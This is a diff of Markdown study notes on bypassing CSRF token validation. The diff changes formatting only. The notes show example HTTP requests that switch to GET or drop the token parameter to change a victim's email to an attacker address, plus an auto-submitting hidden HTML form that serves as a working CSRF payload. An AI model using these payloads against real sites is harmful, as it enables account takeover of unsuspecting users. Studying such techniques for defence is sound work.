@@ -37,12 +37,12 @@ Nota-se que o ataque é cego, ou seja, o invasor não pode ver o que o site-alvo
 # Validation of CSRF token depends on request method
 Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.
 
-In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:
-<i>
-GET /email/change?email=pwned@evil-user.net HTTP/1.1
-Host: vulnerable-website.com
-Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
- </i>
+In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:<br/>
+```
+  GET /email/change?email=pwned@evil-user.net HTTP/1.1<br/>
+  Host: vulnerable-website.com<br/>
+  Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm<br/>
+```
  
  Exploit example:
  ``` html
@@ -58,24 +58,22 @@ Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
 # Validation of CSRF token depends on token being present
 Some applications correctly validate the token when it is present but skip the validation if the token is omitted.
 
-In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:
-<i>
-  POST /email/change HTTP/1.1
-  Host: vulnerable-website.com
-  Content-Type: application/x-www-form-urlencoded
-  Content-Length: 25
-  Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:<br/>
+```
+  POST /email/change HTTP/1.1<br/>
+  Host: vulnerable-website.com<br/>
+  Content-Type: application/x-www-form-urlencoded<br/>
+  Content-Length: 25<br/>
+  Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm<br/>
 
-  email=pwned@evil-user.net
-</i>
-
+  email=pwned@evil-user.net<br/>
+```
 Exploit example:
- ``` html
-  <form method="POST" action="https://vulnerablesite/email/change-email">                        
+ ```html
+  <form method="POST" action="https://vulnerablesite/email/change-email">                    
     <input type="hidden" name="email" value="atacker@email">                    
   </form>
-<script>
-      document.forms[0].submit();
-</script>
-
+  <script>
+    document.forms[0].submit();
+  </script>
 ```
